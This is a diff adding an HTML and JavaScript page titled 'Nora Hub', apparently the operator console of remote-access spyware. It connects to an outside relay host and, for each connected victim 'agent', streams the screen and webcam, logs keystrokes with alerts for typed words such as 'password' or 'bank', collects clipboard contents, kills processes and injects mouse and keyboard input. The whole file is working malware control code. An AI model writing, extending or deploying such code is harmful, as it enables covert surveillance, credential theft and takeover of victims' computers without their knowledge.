@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nora Hub</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:#0d0d0d; color:#e0e0e0; font-family:'Consolas',monospace; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
+
+  #topbar { background:#1a1a1a; border-bottom:1px solid #2a2a2a; padding:8px 16px; display:flex; align-items:center; gap:12px; flex-shrink:0; flex-wrap:wrap; }
+  #topbar h1 { font-size:14px; color:#7c6aff; letter-spacing:2px; text-transform:uppercase; }
+  #status { font-size:12px; padding:3px 10px; border-radius:12px; background:#2a2a2a; }
+  #status.connected { color:#4ade80; }
+  #status.disconnected { color:#f87171; }
+  #fps-info { font-size:11px; color:#555; }
+
+  #agent-select { background:#1a1a1a; border:1px solid #333; color:#e0e0e0; padding:4px 10px; border-radius:6px; font-family:inherit; font-size:12px; cursor:pointer; }
+  #agent-select option { background:#1a1a1a; }
+  #no-agents { font-size:12px; color:#555; display:none; }
+
+  .topbar-btn { padding:4px 14px; border-radius:6px; border:none; font-size:12px; font-family:inherit; cursor:pointer; letter-spacing:1px; transition:background .2s,color .2s; }
+  #cam-btn { background:#2a2a2a; color:#aaa; }
+  #cam-btn.active { background:#1a6640; color:#4ade80; }
+  #cam-btn:hover:not(.active) { background:#1a6640; color:#4ade80; }
+  #cam-btn.active:hover { background:#c0392b; color:#fff; }
+  #rec-btn { margin-left:auto; background:#2a2a2a; color:#aaa; }
+  #rec-btn:hover:not(.recording) { background:#c0392b; color:#fff; }
+  #rec-btn.recording { background:#c0392b; color:#fff; animation:pulse 1.2s infinite; }
+  #rec-timer { font-size:11px; color:#f87171; font-weight:bold; display:none; }
+  #rec-timer.visible { display:block; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
+
+  #main { display:flex; flex:1; overflow:hidden; }
+  #view-area { flex:1; display:flex; flex-direction:column; overflow:hidden; }
+
+  #screen-panel { flex:1; display:flex; align-items:center; justify-content:center; background:#080808; position:relative; overflow:hidden; }
+  #screen { max-width:100%; max-height:100%; object-fit:contain; cursor:none; display:block; user-select:none; }
+  #cursor { position:absolute; width:16px; height:16px; border:2px solid #7c6aff; border-radius:50%; pointer-events:none; transform:translate(-50%,-50%); display:none; }
+
+  #camera-panel { height:200px; background:#050505; border-top:1px solid #222; display:none; align-items:center; justify-content:center; flex-shrink:0; }
+  #camera-panel.visible { display:flex; }
+  #camera-feed { max-height:100%; max-width:100%; object-fit:contain; display:block; }
+  #cam-placeholder { color:#333; font-size:12px; }
+
+  #sidebar { width:320px; background:#111; border-left:1px solid #222; display:flex; flex-direction:column; flex-shrink:0; }
+
+  .tab-bar { display:flex; background:#1a1a1a; border-bottom:1px solid #2a2a2a; flex-shrink:0; }
+  .tab { flex:1; padding:8px 4px; font-size:11px; text-align:center; cursor:pointer; color:#555; letter-spacing:.5px; text-transform:uppercase; border-bottom:2px solid transparent; transition:color .2s; }
+  .tab.active { color:#7c6aff; border-bottom-color:#7c6aff; }
+  .tab:hover:not(.active) { color:#aaa; }
+
+  .tab-panel { flex:1; display:none; flex-direction:column; overflow:hidden; }
+  .tab-panel.active { display:flex; }
+
+  .panel-header { background:#1a1a1a; padding:7px 10px; font-size:10px; text-transform:uppercase; letter-spacing:1px; color:#7c6aff; border-bottom:1px solid #2a2a2a; display:flex; justify-content:space-between; align-items:center; flex-shrink:0; gap:6px; }
+  #keylog { flex:1; overflow-y:auto; padding:10px; font-size:12px; line-height:1.7; word-break:break-all; color:#ccc; }
+  #keylog::-webkit-scrollbar { width:4px; }
+  #keylog::-webkit-scrollbar-thumb { background:#333; }
+  .key-special { color:#7c6aff; font-weight:bold; }
+  .key-enter { display:block; border-top:1px solid #222; margin:4px 0; padding-top:2px; }
+  .hdr-btn { background:none; border:1px solid #333; color:#666; padding:2px 7px; border-radius:4px; font-size:10px; cursor:pointer; font-family:inherit; white-space:nowrap; }
+  .hdr-btn:hover { border-color:#7c6aff; color:#7c6aff; }
+
+  #alert-section { border-top:1px solid #222; padding:8px 10px; flex-shrink:0; }
+  #alert-section label { font-size:10px; color:#555; text-transform:uppercase; letter-spacing:.5px; display:block; margin-bottom:5px; }
+  #alert-input-row { display:flex; gap:5px; }
+  #alert-input { flex:1; background:#0d0d0d; border:1px solid #333; color:#ccc; padding:4px 7px; border-radius:4px; font-family:inherit; font-size:11px; }
+  #alert-add-btn { background:#2a2a2a; border:none; color:#aaa; padding:4px 9px; border-radius:4px; cursor:pointer; font-family:inherit; font-size:11px; }
+  #alert-add-btn:hover { background:#7c6aff; color:#fff; }
+  #alert-tags { display:flex; flex-wrap:wrap; gap:4px; margin-top:5px; }
+  .alert-tag { background:#1e1a3a; color:#7c6aff; font-size:10px; padding:2px 7px; border-radius:10px; cursor:pointer; }
+  .alert-tag:hover { background:#c0392b; color:#fff; }
+
+  #clipboard-list { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:6px; }
+  #clipboard-list::-webkit-scrollbar { width:4px; }
+  #clipboard-list::-webkit-scrollbar-thumb { background:#333; }
+  .clip-item { background:#0d0d0d; border:1px solid #222; border-radius:5px; padding:7px 9px; font-size:11px; color:#ccc; word-break:break-all; position:relative; cursor:pointer; }
+  .clip-item:hover { border-color:#7c6aff; }
+  .clip-time { font-size:9px; color:#444; margin-bottom:3px; }
+  .clip-text { white-space:pre-wrap; max-height:80px; overflow:hidden; }
+
+  #proc-controls { display:flex; gap:6px; padding:7px 10px; border-bottom:1px solid #222; flex-shrink:0; align-items:center; }
+  #proc-search { flex:1; background:#0d0d0d; border:1px solid #333; color:#ccc; padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
+  #proc-refresh { background:#2a2a2a; border:none; color:#aaa; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
+  #proc-refresh:hover { background:#7c6aff; color:#fff; }
+  #proc-list { flex:1; overflow-y:auto; font-size:11px; }
+  #proc-list::-webkit-scrollbar { width:4px; }
+  #proc-list::-webkit-scrollbar-thumb { background:#333; }
+  .proc-row { display:grid; grid-template-columns:1fr 50px 60px 36px; gap:4px; align-items:center; padding:5px 10px; border-bottom:1px solid #1a1a1a; }
+  .proc-row:hover { background:#151515; }
+  .proc-name { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:#ddd; }
+  .proc-cpu { text-align:right; color:#f59e0b; font-size:10px; }
+  .proc-mem { text-align:right; color:#60a5fa; font-size:10px; }
+  .proc-kill { background:#3a1a1a; border:none; color:#f87171; padding:2px 5px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
+  .proc-kill:hover { background:#c0392b; color:#fff; }
+  .proc-header { display:grid; grid-template-columns:1fr 50px 60px 36px; gap:4px; padding:5px 10px; font-size:10px; color:#444; border-bottom:1px solid #2a2a2a; text-transform:uppercase; flex-shrink:0; }
+
+  #control-panel { border-top:1px solid #222; padding:10px 12px; font-size:11px; color:#666; flex-shrink:0; }
+  #control-panel label { display:flex; align-items:center; gap:8px; cursor:pointer; }
+  #control-panel input[type=checkbox] { accent-color:#7c6aff; }
+  .hotkey-hint { font-size:10px; color:#444; margin-top:5px; }
+</style>
+</head>
+<body>
+
+<div id="topbar">
+  <h1>Nora Hub</h1>
+  <span id="status" class="disconnected">Disconnected</span>
+  <select id="agent-select" onchange="selectAgent(this.value)">
+    <option value="">— no agents —</option>
+  </select>
+  <span id="no-agents" style="font-size:11px;color:#555;display:none;">Waiting for agents…</span>
+  <span id="fps-info">-- fps</span>
+  <span id="rec-timer"></span>
+  <button id="cam-btn" class="topbar-btn" onclick="toggleCamera()">📷 Camera</button>
+  <button id="rec-btn" class="topbar-btn" onclick="toggleRecord()">⏺ REC</button>
+</div>
+
+<div id="main">
+  <div id="view-area">
+    <div id="screen-panel">
+      <canvas id="screen"></canvas>
+      <div id="cursor"></div>
+    </div>
+    <div id="camera-panel">
+      <span id="cam-placeholder">Camera off</span>
+      <img id="camera-feed" alt="camera" style="display:none;" draggable="false">
+    </div>
+  </div>
+
+  <div id="sidebar">
+    <div class="tab-bar">
+      <div class="tab active" onclick="switchTab('keylog')">Keylog</div>
+      <div class="tab" onclick="switchTab('clipboard')">Clipboard</div>
+      <div class="tab" onclick="switchTab('processes')">Processes</div>
+    </div>
+
+    <div id="tab-keylog" class="tab-panel active">
+      <div class="panel-header">
+        Keylog
+        <div style="display:flex;gap:5px;">
+          <button class="hdr-btn" onclick="saveLog()">Save .txt</button>
+          <button class="hdr-btn" onclick="clearLog()">Clear</button>
+        </div>
+      </div>
+      <div id="keylog"></div>
+      <div id="alert-section">
+        <label>Keyword Alerts (browser notification)</label>
+        <div id="alert-input-row">
+          <input id="alert-input" placeholder="e.g. password, bank..." onkeydown="if(event.key==='Enter')addAlert()">
+          <button id="alert-add-btn" onclick="addAlert()">Add</button>
+        </div>
+        <div id="alert-tags"></div>
+      </div>
+    </div>
+
+    <div id="tab-clipboard" class="tab-panel">
+      <div class="panel-header">
+        Clipboard History
+        <button class="hdr-btn" onclick="clearClipboard()">Clear</button>
+      </div>
+      <div id="clipboard-list"><span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span></div>
+    </div>
+
+    <div id="tab-processes" class="tab-panel">
+      <div id="proc-controls">
+        <input id="proc-search" placeholder="Search process..." oninput="filterProcs()">
+        <button id="proc-refresh" onclick="loadProcs()">Refresh</button>
+      </div>
+      <div class="proc-header"><span>Name</span><span style="text-align:right">CPU%</span><span style="text-align:right">MB</span><span></span></div>
+      <div id="proc-list"></div>
+    </div>
+
+    <div id="control-panel">
+      <label><input type="checkbox" id="ctrl-toggle" checked> Remote control active</label>
+      <div class="hotkey-hint">Ctrl+Shift+D — toggle control</div>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+const RELAY = "https://mon.eclipselivecam.online";
+
+const canvas      = document.getElementById("screen");
+const ctx         = canvas.getContext("2d");
+const keylogEl    = document.getElementById("keylog");
+const statusEl    = document.getElementById("status");
+const fpsEl       = document.getElementById("fps-info");
+const cursorEl    = document.getElementById("cursor");
+const ctrlToggle  = document.getElementById("ctrl-toggle");
+const screenPanel = document.getElementById("screen-panel");
+const recBtn      = document.getElementById("rec-btn");
+const recTimer    = document.getElementById("rec-timer");
+const camBtn      = document.getElementById("cam-btn");
+const camPanel    = document.getElementById("camera-panel");
+const camFeed     = document.getElementById("camera-feed");
+const camPlaceholder = document.getElementById("cam-placeholder");
+const agentSelect = document.getElementById("agent-select");
+
+let selectedAgent = "";
+let frameCount = 0, lastFpsTime = Date.now();
+let cameraActive = false;
+let allProcs = [];
+let alertKeywords = [];
+let keylogText = "";
+
+const socket = io(RELAY, { transports: ["polling", "websocket"] });
+
+// ── Connection ────────────────────────────────────────────────────────────────
+socket.on("connect", () => {
+  statusEl.textContent = "Connected";
+  statusEl.className = "connected";
+  socket.emit("hub_join", {});
+});
+socket.on("disconnect", () => {
+  statusEl.textContent = "Disconnected";
+  statusEl.className = "disconnected";
+});
+
+// ── Agent list ────────────────────────────────────────────────────────────────
+socket.on("agent_list", agents => {
+  const prev = selectedAgent;
+  agentSelect.innerHTML = agents.length
+    ? agents.map(a => `<option value="${escAttr(a.name)}">${escHtml(a.name)}</option>`).join("")
+    : '<option value="">— no agents —</option>';
+  if (prev && agents.find(a => a.name === prev)) {
+    agentSelect.value = prev;
+  } else if (agents.length) {
+    selectedAgent = agents[0].name;
+    agentSelect.value = selectedAgent;
+  } else {
+    selectedAgent = "";
+  }
+});
+
+function selectAgent(name) {
+  selectedAgent = name;
+  clearLog();
+  clearClipboard();
+}
+
+function target() { return selectedAgent; }
+
+// ── Tabs ──────────────────────────────────────────────────────────────────────
+function switchTab(name) {
+  document.querySelectorAll(".tab").forEach((t, i) => {
+    const names = ["keylog", "clipboard", "processes"];
+    t.className = "tab" + (names[i] === name ? " active" : "");
+  });
+  document.querySelectorAll(".tab-panel").forEach(p => p.className = "tab-panel");
+  document.getElementById("tab-" + name).className = "tab-panel active";
+  if (name === "processes") loadProcs();
+}
+
+// ── Screen ────────────────────────────────────────────────────────────────────
+const frameImg = new Image();
+frameImg.onload = () => {
+  canvas.width = frameImg.naturalWidth;
+  canvas.height = frameImg.naturalHeight;
+  ctx.drawImage(frameImg, 0, 0);
+};
+socket.on("frame", d => {
+  if (d._agent !== selectedAgent) return;
+  frameImg.src = "data:image/jpeg;base64," + d.data;
+  frameCount++;
+  const now = Date.now();
+  if (now - lastFpsTime >= 1000) { fpsEl.textContent = frameCount + " fps"; frameCount = 0; lastFpsTime = now; }
+});
+
+// ── Keylog ────────────────────────────────────────────────────────────────────
+socket.on("key", d => {
+  if (d._agent !== selectedAgent) return;
+  const char = d.char;
+  keylogText += char === "[ENTER]" ? "\n" : char;
+  const span = document.createElement("span");
+  if (char === "[ENTER]") { span.className = "key-special key-enter"; span.textContent = char + "\n"; }
+  else if (char.startsWith("[") && char.endsWith("]")) { span.className = "key-special"; span.textContent = char; }
+  else span.textContent = char;
+  keylogEl.appendChild(span);
+  keylogEl.scrollTop = keylogEl.scrollHeight;
+  checkAlerts(keylogText);
+});
+
+function clearLog() { keylogEl.innerHTML = ""; keylogText = ""; }
+function saveLog() {
+  const blob = new Blob([keylogText], { type: "text/plain" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "keylog_" + new Date().toISOString().slice(0,19).replace(/[:.]/g,"-") + ".txt";
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+// ── Keyword Alerts ────────────────────────────────────────────────────────────
+function addAlert() {
+  const val = document.getElementById("alert-input").value.trim().toLowerCase();
+  if (!val || alertKeywords.includes(val)) return;
+  alertKeywords.push(val);
+  document.getElementById("alert-input").value = "";
+  renderAlertTags();
+  Notification.requestPermission();
+}
+function renderAlertTags() {
+  document.getElementById("alert-tags").innerHTML = alertKeywords.map(k =>
+    `<span class="alert-tag" onclick="removeAlert('${escAttr(k)}')" title="Click to remove">${escHtml(k)} ✕</span>`
+  ).join("");
+}
+function removeAlert(kw) { alertKeywords = alertKeywords.filter(k => k !== kw); renderAlertTags(); }
+let _lastAlertAt = {};
+function checkAlerts(text) {
+  const lower = text.toLowerCase();
+  alertKeywords.forEach(kw => {
+    if (lower.includes(kw)) {
+      const now = Date.now();
+      if (!_lastAlertAt[kw] || now - _lastAlertAt[kw] > 10000) {
+        _lastAlertAt[kw] = now;
+        if (Notification.permission === "granted")
+          new Notification("Nora Hub — Keyword Detected", { body: `"${kw}" was typed` });
+      }
+    }
+  });
+}
+
+// ── Clipboard ─────────────────────────────────────────────────────────────────
+const clipList = document.getElementById("clipboard-list");
+let clipItems = [];
+socket.on("clipboard", d => {
+  if (d._agent !== selectedAgent) return;
+  clipItems.unshift({ text: d.text, time: new Date().toLocaleTimeString() });
+  if (clipItems.length > 100) clipItems.pop();
+  renderClipboard();
+});
+function renderClipboard() {
+  if (!clipItems.length) { clipList.innerHTML = '<span style="color:#333;padding:10px;font-size:11px;">Nothing copied yet...</span>'; return; }
+  clipList.innerHTML = clipItems.map((c, i) =>
+    `<div class="clip-item" onclick="copyClipItem(${i})">
+      <div class="clip-time">${c.time} — click to copy</div>
+      <div class="clip-text">${escHtml(c.text.slice(0,300))}${c.text.length>300?"…":""}</div>
+    </div>`
+  ).join("");
+}
+function copyClipItem(i) { navigator.clipboard.writeText(clipItems[i].text); }
+function clearClipboard() { clipItems = []; renderClipboard(); }
+
+// ── Processes ─────────────────────────────────────────────────────────────────
+function loadProcs() {
+  if (!selectedAgent) return;
+  socket.emit("get_processes", { _target: selectedAgent });
+}
+socket.on("processes_result", d => {
+  allProcs = d.processes || [];
+  filterProcs();
+});
+function filterProcs() {
+  const q = document.getElementById("proc-search").value.toLowerCase();
+  const filtered = q ? allProcs.filter(p => p.name.toLowerCase().includes(q)) : allProcs;
+  document.getElementById("proc-list").innerHTML = filtered.map(p =>
+    `<div class="proc-row">
+      <span class="proc-name" title="${escAttr(p.name)}">${escHtml(p.name)}</span>
+      <span class="proc-cpu">${p.cpu}%</span>
+      <span class="proc-mem">${p.mem}MB</span>
+      <button class="proc-kill" onclick="killProc(${p.pid})">Kill</button>
+    </div>`
+  ).join("");
+}
+function killProc(pid) {
+  if (!confirm(`Kill PID ${pid}?`)) return;
+  socket.emit("kill_process", { pid, _target: selectedAgent });
+  setTimeout(loadProcs, 500);
+}
+
+// ── Camera ────────────────────────────────────────────────────────────────────
+socket.on("camera_frame", d => { if (cameraActive && d._agent === selectedAgent) camFeed.src = "data:image/jpeg;base64," + d.data; });
+function toggleCamera() {
+  if (!selectedAgent) return;
+  if (cameraActive) {
+    socket.emit("camera_off", { _target: selectedAgent });
+    updateCamUI(false);
+  } else {
+    socket.emit("camera_on", { _target: selectedAgent });
+    updateCamUI(true);
+  }
+}
+function updateCamUI(active) {
+  cameraActive = active;
+  camBtn.textContent = active ? "📷 Camera ON" : "📷 Camera";
+  camBtn.className = active ? "topbar-btn active" : "topbar-btn";
+  camPanel.className = active ? "visible" : "";
+  camFeed.style.display = active ? "block" : "none";
+  if (!active) { camFeed.src = ""; camPlaceholder.style.display = "block"; camPlaceholder.textContent = "Camera off"; }
+  else camPlaceholder.style.display = "none";
+}
+
+// ── Recording ─────────────────────────────────────────────────────────────────
+let mediaRecorder = null, fileWriter = null, recSeconds = 0, recInterval = null;
+const hasFSA = typeof window.showSaveFilePicker === "function";
+async function toggleRecord() {
+  if (!hasFSA) { alert("Use Chrome or Edge to record."); return; }
+  if (mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); return; }
+  try {
+    const ts = new Date().toISOString().replace(/[:.]/g,"-").slice(0,19);
+    const handle = await window.showSaveFilePicker({ suggestedName: `nora_${ts}.webm`, types:[{description:"WebM Video",accept:{"video/webm":[".webm"]}}] });
+    fileWriter = await handle.createWritable();
+    const stream = canvas.captureStream(12);
+    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
+    mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
+    mediaRecorder.ondataavailable = async e => { if (e.data?.size > 0) await fileWriter.write(e.data); };
+    mediaRecorder.onstop = async () => {
+      await fileWriter.close(); fileWriter = null; mediaRecorder = null;
+      recBtn.textContent = "⏺ REC"; recBtn.className = "topbar-btn";
+      recTimer.className = ""; clearInterval(recInterval); recSeconds = 0;
+    };
+    mediaRecorder.start(1000);
+    recBtn.textContent = "⏹ STOP"; recBtn.className = "topbar-btn recording";
+    recSeconds = 0; recTimer.className = "visible";
+    recInterval = setInterval(() => {
+      recSeconds++;
+      const h = String(Math.floor(recSeconds/3600)).padStart(2,"0");
+      const m = String(Math.floor((recSeconds%3600)/60)).padStart(2,"0");
+      const s = String(recSeconds%60).padStart(2,"0");
+      recTimer.textContent = `● ${h}:${m}:${s}`;
+    }, 1000);
+  } catch(e) {}
+}
+
+// ── Remote control ────────────────────────────────────────────────────────────
+function controlActive() { return ctrlToggle.checked && !!selectedAgent; }
+function cmd(data) { if (controlActive()) socket.emit("command", { ...data, _target: selectedAgent }); }
+
+screenPanel.addEventListener("mousemove", e => {
+  const r = canvas.getBoundingClientRect();
+  const x = e.clientX - r.left, y = e.clientY - r.top;
+  cursorEl.style.left = (x + r.left) + "px"; cursorEl.style.top = (y + r.top) + "px"; cursorEl.style.display = "block";
+  cmd({ action:"mousemove", x:Math.max(0,x), y:Math.max(0,y), sw:r.width, sh:r.height });
+});
+screenPanel.addEventListener("mouseleave", () => { cursorEl.style.display = "none"; });
+screenPanel.addEventListener("mousedown",  e => cmd({ action:"mousedown", button:e.button }));
+screenPanel.addEventListener("mouseup",    e => cmd({ action:"mouseup",   button:e.button }));
+screenPanel.addEventListener("contextmenu",e => e.preventDefault());
+screenPanel.addEventListener("wheel",      e => cmd({ action:"scroll", delta:e.deltaY<0?3:-3 }));
+document.addEventListener("keydown", e => {
+  if (e.ctrlKey && e.shiftKey && e.key === "D") { ctrlToggle.checked = !ctrlToggle.checked; return; }
+  if (!controlActive() || document.activeElement !== document.body) return;
+  e.preventDefault(); cmd({ action:"keydown", key:e.key });
+});
+document.addEventListener("keyup", e => {
+  if (!controlActive() || document.activeElement !== document.body) return;
+  e.preventDefault(); cmd({ action:"keyup", key:e.key });
+});
+
+// ── Helpers ───────────────────────────────────────────────────────────────────
+function escHtml(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+function escAttr(s) { return String(s).replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
+</script>
+</body>
+</html>
